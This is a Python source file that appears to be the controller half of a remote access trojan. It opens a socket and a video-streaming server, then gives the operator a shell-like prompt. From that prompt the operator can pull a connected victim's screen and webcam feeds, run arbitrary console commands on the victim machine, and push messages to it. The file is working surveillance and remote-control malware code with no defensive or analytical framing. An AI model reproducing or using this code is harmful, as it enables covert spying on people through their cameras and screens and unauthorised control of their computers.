from vidstream import *
import socket
from colorama import init, Fore
import os
from prettytable import PrettyTable


def per_help():
	commands_name = [
		"screen",
		"webcam",
		"clear",
		"~",
		"message",
		"help"
	]
	commands_description = [
		"Get data of screen from client",
		"Get data of webcam from client",
		"Clear console",
		"Play the console command (~ start explorer.exe)",
		"Send message to client",
		"View list of commands"
	]

	table = PrettyTable([f"{Fore.GREEN}Command name{Fore.RESET}", f"{Fore.CYAN}Command description{Fore.RESET}"])

	for cn, cdesc in zip(commands_name, commands_description):
		table.add_row([cn, f"{Fore.YELLOW}{cdesc}{Fore.RESET}"])

	return table


init()

local_ip_address = socket.gethostbyname(socket.gethostname())
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((local_ip_address, port))
s.listen(5)

client, addr = s.accept()
network_name = client.recv(1024).decode("utf-8")

print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")

server = StreamingServer(local_ip_address, 9999)
server.start_server()

print("[~] Servers was successfully started")

while True:
	cmd = input(f"{Fore.RED}{addr[0]}@{network_name}~#{Fore.RESET}{Fore.BLUE} ")

	if cmd == "screen":
		client.send(cmd.encode("utf-8"))
	elif cmd == "webcam":
		client.send(cmd.encode("utf-8"))
	elif cmd == "clear":
		os.system("cls")
	elif "~" in cmd:
		client.send(cmd.encode("utf-8"))
	elif cmd == "message":
		client.send(cmd.encode("utf-8"))

		print(f"{Fore.YELLOW}[1] Message\n[2] A message with answer")
		message_cmd = input(f"> ")

		if message_cmd == "1":
			client.send(message_cmd.encode("utf-8"))

			umsg = input(f"message>{Fore.RESET} ")
			client.send(umsg.encode("utf-8"))
		elif message_cmd == "2":
			client.send(message_cmd.encode("utf-8"))

			umsg = input(f"message>{Fore.RESET} ")
			client.send(umsg.encode("utf-8"))

			print(f"{Fore.CYAN}Message from client:{Fore.RESET} {client.recv(4096).decode('utf-8')}\n")
		else:
			print("Wrong argument")
	elif cmd == "help":
		print(per_help())